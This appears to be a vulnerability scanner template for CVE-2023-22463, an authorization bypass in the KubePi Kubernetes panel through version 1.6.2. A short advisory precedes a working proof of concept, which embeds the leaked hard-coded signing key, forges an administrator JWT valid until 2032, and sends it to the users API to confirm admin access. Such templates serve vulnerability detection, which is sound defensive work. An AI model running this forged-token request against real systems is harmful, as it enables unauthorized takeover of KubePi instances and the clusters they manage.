id: CVE-2023-22463

info:
  name: KubePi Version 1.6.2 Authorization Bypass
  author: dwisiswant0
  severity: critical
  description: |
    KubePi is a k8s panel. The jwt authentication function of KubePi through
    version 1.6.2 uses hard-coded Jwtsigkeys, resulting in the same Jwtsigkeys
    for all online projects. This means that an attacker can forge any jwt token
    to take over the administrator account of any online project. Furthermore,
    they may use the administrator to take over the k8s cluster of the target
    enterprise. `session.go`, the use of hard-coded JwtSigKey, allows an attacker
    to use this value to forge jwt tokens arbitrarily. The JwtSigKey is confidential
    and should not be hard-coded in the code. The vulnerability has been fixed in
    1.6.3. In the patch, JWT key is specified in app.yml. If the user leaves it
    blank, a random key will be used. There are no workarounds aside from upgrading.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22463
    - https://huntr.dev/bounties/bd6f0426-3132-47b4-8eb1-1d3db3f10637/
  tags: cve,cve2023,k8s,kubernetes,devops,kube

variables:
  json: |
    {
      "name": "admin",
      "nickName": "Administrator",
      "email": "admin@domain.tld",
      "language": "en-EN",
      "resourcePermissions": {},
      "isAdministrator": true,
      "mfa": {
        "enable": false,
        "secret": "",
        "approved": false
      }
    }
  sig: "signature_hmac_secret_shared_key"
  age: '{{to_unix_time("2032-12-30T16:30:10+00:00")}}'
  jwt: '{{generate_jwt(json, "HS256", "{{sig}}", "{{age}}")}}'

requests:
  - method: GET
    path:
      - "{{BaseURL}}/kubeapi/api/v1/users"
    headers:
      Authorization: Bearer {{jwt}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex # matcher for .data.uuid (JSON)
        regex:
          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
        part: body

      - type: dsl
        dsl:
          - 'contains(all_headers, "SESS_COOKIE_KUBEAPI")'